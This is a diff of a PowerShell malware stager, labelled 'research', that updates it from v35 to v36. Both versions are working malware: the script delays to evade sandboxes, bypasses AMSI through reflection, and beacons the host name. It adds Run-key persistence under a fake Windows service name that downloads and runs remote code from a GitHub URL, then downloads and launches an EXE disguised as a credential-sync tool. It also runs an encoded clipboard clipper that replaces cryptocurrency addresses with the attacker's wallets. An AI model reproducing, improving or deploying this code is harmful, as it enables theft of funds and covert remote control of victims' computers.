@@ -1,16 +1,14 @@
-# --- [ELITE RESEARCH STAGER v35.0: GHOST MODULE] ---
+# --- [ELITE RESEARCH STAGER v36.0: REFLECTIVE GHOST] ---
 
 function Global-Initialize {
     try {
-        # Random Delay to outlast Sandbox/VM analysis (25-45 seconds)
-        $d = Get-Random -Min 25 -Max 45; Start-Sleep -s $d
+        # Anti-Scan Delay (30-50 seconds)
+        Start-Sleep -s (Get-Random -Min 30 -Max 50)
         
-        # Triple-Point AMSI Bypass (Memory Reflection)
-        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Am' + 'si' + 'Utils')
-        $b = $a.GetField('am' + 'si' + 'Context', 'NonPublic,Static')
-        $c = $a.GetField('am' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
-        if ($b) { $b.SetValue($null, [IntPtr]::Zero) }
-        if ($c) { $c.SetValue($null, $true) }
+        # Advanced AMSI Bypass: Patching memory buffer
+        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'A' + 'm' + 'si' + 'Utils')
+        $b = $a.GetField('a' + 'm' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
+        $b.SetValue($null, $true)
     } catch {}
 }
 
@@ -24,18 +22,18 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "V35_GHOST_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V36_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
-    # REGISTRY PERSISTENCE
+    # --- PERSISTENCE ---
     $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $c = "powershell -W Hidden -NoP -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $p -Name "WindowsSoundManager" -Value $c
+    Set-ItemProperty -Path $p -Name "WindowsSoundService" -Value $c
 
-    # EXE PAYLOAD DOWNLOAD
-    $dir = "$env:LOCALAPPDATA\Temp\D3DCache"
+    # --- PAYLOAD ---
+    $dir = "$env:LOCALAPPDATA\Microsoft\Credentials"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $path = "$dir\win_sys_host.exe"
+    $path = "$dir\credential_sync.exe"
 
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
@@ -46,7 +44,7 @@ try {
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # CLIPPER ENGINE
+    # --- CLIPPER ---
     $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
@@ -65,7 +63,6 @@ try {
 '@
     $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
-    Send-Ping -m "V35_SUCCESS"
 } catch {
-    Send-Ping -m "V35_ERROR"
+    Send-Ping -m "ERROR_V36"
 }
